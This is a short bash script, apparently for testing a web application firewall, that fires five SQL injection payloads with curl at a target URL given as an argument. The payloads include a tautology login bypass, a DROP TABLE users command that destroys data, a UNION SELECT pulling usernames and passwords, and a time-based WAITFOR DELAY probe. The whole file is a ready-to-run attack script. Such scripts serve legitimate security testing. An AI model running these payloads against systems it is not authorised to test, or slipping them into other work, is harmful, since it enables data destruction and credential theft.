#!/bin/bash

# SQL Injection Attack Simulation Script
# Usage: ./sql-injection-test.sh <target-url>

TARGET_URL=${1:-"http://localhost:3000"}

echo "🚨 SQL Injection Attack Simulation"
echo "Target: $TARGET_URL"
echo "=================================="

# Test 1: Basic SQL injection in search
echo -e "\n1. Testing SQL injection in search endpoint..."
echo "Attack: ' OR '1'='1"
curl -s "$TARGET_URL/search?q=' OR '1'='1" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/search?q=' OR '1'='1"

echo -e "\n"

# Test 2: DROP TABLE attack
echo "2. Testing DROP TABLE attack..."
echo "Attack: '; DROP TABLE users; --"
curl -s "$TARGET_URL/search?q='; DROP TABLE users; --" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/search?q='; DROP TABLE users; --"

echo -e "\n"

# Test 3: UNION SELECT attack
echo "3. Testing UNION SELECT attack..."
echo "Attack: ' UNION SELECT username,password FROM users --"
curl -s "$TARGET_URL/api/user-profile?id=' UNION SELECT username,password FROM users --" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/api/user-profile?id=' UNION SELECT username,password FROM users --"

echo -e "\n"

# Test 4: SQL injection in user filter
echo "4. Testing SQL injection in user filter..."
echo "Attack: ' OR 1=1 --"
curl -s "$TARGET_URL/api/users?filter=' OR 1=1 --" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/api/users?filter=' OR 1=1 --"

echo -e "\n"

# Test 5: Time-based SQL injection
echo "5. Testing time-based SQL injection..."
echo "Attack: '; WAITFOR DELAY '00:00:05' --"
start_time=$(date +%s)
curl -s "$TARGET_URL/search?q='; WAITFOR DELAY '00:00:05' --" | jq '.' 2>/dev/null || curl -s "$TARGET_URL/search?q='; WAITFOR DELAY '00:00:05' --"
end_time=$(date +%s)
duration=$((end_time - start_time))
echo "Request took: ${duration} seconds"

echo -e "\n=================================="
echo "SQL Injection tests completed!"
echo "Check the application logs and WAF dashboard for blocked requests."
